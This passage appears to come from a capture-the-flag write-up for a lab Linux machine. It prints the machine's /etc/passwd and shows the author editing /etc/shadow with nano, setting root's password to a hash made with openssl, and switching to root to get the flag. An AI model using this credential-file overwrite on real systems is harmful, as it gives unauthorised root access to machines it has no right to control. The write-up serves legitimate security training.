sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false
zeamkish:x:1001:1001:Zeam Kish,1,1,:/home/zeamkish:/bin/bash

ftp:x:114:121:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
bind:x:115:122::/var/cache/bind:/usr/sbin/nologin
Debian-snmp:x:116:123::/var/lib/snmp:/bin/false
redis:x:117:124::/var/lib/redis:/usr/sbin/nologin
mosquitto:x:118:125::/var/lib/mosquitto:/usr/sbin/nologin
fwupd-refresh:x:119:126:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
```

/usr/bin/nano /etc/shadow

I wasn’t able to crack the password, but maybe  can just change it.

I generated the password using

```bash
openssl passwd -6 -salt xyz cat
```

And then I replaced the root one:

```bash
root:$6$xyz$SY6bQy3sDajZ0bHnCG35i3R6ykQksyM6FsKDhwWIi6PAr1tmNG2IIkuMaKq.eZtztGCTScNGLxe9Fdzn4CBMK1:7:::
daemon:*:18561:0:99999:7:::
bin:*:18561:0:99999:7:::
sys:*:18561:0:99999:7:::
sync:*:18561:0:99999:7:::
games:*:18561:0:99999:7:::
man:*:18561:0:99999:7:::
lp:*:18561:0:99999:7:::
mail:*:18561:0:99999:7:::
news:*:18561:0:99999:7:::
uucp:*:18561:0:99999:7:::
proxy:*:18561:0:99999:7:::
www-data:*:18561:0:99999:7:::
backup:*:18561:0:99999:7:::
list:*:18561:0:99999:7:::
irc:*:18561:0:99999:7:::
gnats:*:18561:0:99999:7:::
nobody:*:18561:0:99999:7:::
systemd-network:*:18561:0:99999:7:::
systemd-resolve:*:18561:0:99999:7:::
systemd-timesync:*:18561:0:99999:7:::
messagebus:*:18561:0:99999:7:::
syslog:*:18561:0:99999:7:::
_apt:*:18561:0:99999:7:::
tss:*:18561:0:99999:7:::
uuidd:*:18561:0:99999:7:::
tcpdump:*:18561:0:99999:7:::
sshd:*:18561:0:99999:7:::
landscape:*:18561:0:99999:7:::
pollinate:*:18561:0:99999:7:::
ec2-instance-connect:!:18561:0:99999:7:::
systemd-coredump:!!:19502::::::
ubuntu:<redacted>:19519:0:99999:7:::
lxd:!:19502::::::
mysql:!:19502:0:99999:7:::
zeamkish:<redacted>.:19516:0:99999:7:::
ftp:*:19519:0:99999:7:::
bind:*:19523:0:99999:7:::
Debian-snmp:!:19523:0:99999:7:::
redis:*:19523:0:99999:7:::
mosquitto:*:19523:0:99999:7:::
fwupd-refresh:*:19544:0:99999:7:::
```

So now I can su as the root and get the flag in the root directory.

```bash
su root
Password: cat
root@ip-10-10-108-101:/home/zeamkish#
```
